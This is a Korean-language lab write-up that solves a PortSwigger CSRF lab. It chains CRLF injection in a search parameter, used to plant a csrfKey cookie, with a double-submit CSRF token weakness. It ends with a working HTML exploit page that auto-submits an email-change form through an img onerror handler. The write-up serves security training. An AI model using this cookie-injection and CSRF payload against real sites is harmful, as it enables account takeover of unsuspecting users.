# 🚩Lab: CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

### 🔍 분석 및 공격 과정
1. 랩에 접속하자 마자 검색란이 눈에 띈다. 임의의 문자열 `exa`을 search 해보자.
2. proxy로 살펴본 결과 돌아오는 응답의 `Set-Cookie` 헤더에 검색한 문자열이 들어가는게 눈에 띈다.
```html
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=exa; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4057
```
3. 혹시 줄바꿈을 뜻하는 `\r\n`인 `%0d%0a`가 이스케이프 처리 되는지 확인해보자.
4. `exa%0d%0aSet-Cookie: x=3`를 검색해보자.
```html
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=exa
Set-Cookie: x=3; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
```
5. 성공적으로 다음 셋쿠키 헤더로 넘어가진다.
6. 그렇다면 해당 검색 기능에는 쿠키를 설정할 수 있는 취약점이 있다.
7. 자 이제 wiener 계정으로 로그인해본다.
8. 이메일을 변경하는 요청을 프록시로 가로채보자.
9. Cookie에 `csrfKey` 가 포함되는 것과 바디에 `csrf`가 포함되는 것이 눈에 띄며, 서로 다른 값을 가지고 있다.
10. 만약 해당 애플리케이션이 csrf검증 라이브러리와 세션관리 라이브러리가 서로 달라 제대로 통합되어 있지 않다면, CSRF토큰 검증이 세션에 묶여 있지 않을 수 있다.
 즉, `csrfKey`와 `csrf`토큰 값이 매칭되는지만 체크하며 세션과 관계없을 수 있다. 마침 검색 기능에 쿠키를 설정할 수 있는 취약점도 존재하기에 딱 들어맞는 랩이긴 하다.
11. 앞의 추측을 바탕으로 HTML 페이지 작성.
```html
<body>
    <form method="POST" action="https://0a6a009b0346495880b83f9700c600e5.web-security-academy.net/my-account/change-email">
        <input name="email" value="hackd@ed.com">
        <input name="csrf" value="4ttR9q8SoafIiLjNQ4VFOGp8MSJxyQcl">
    </form>
    <img src="https://0a6a009b0346495880b83f9700c600e5.web-security-academy.net/?search=exa%0d%0aSet-Cookie%3a+csrfKey%3deXGIh5r9Up8SPQvIv6RBEPW06zCDuJr7%3bSameSite%3dNone" onerror=document.forms[0].submit()>
</body>
```
12. solve          
### 💡 취약점 원리
 CSRF검증과 세션이 매칭이 전혀 되어 있지않음. 즉 타인의 CSRF 토큰과 csrfKey 쿠키 쌍으로 검증 통과가능. 그리고 search기능에 존재하는 이스케이프 처리도 문제였음.
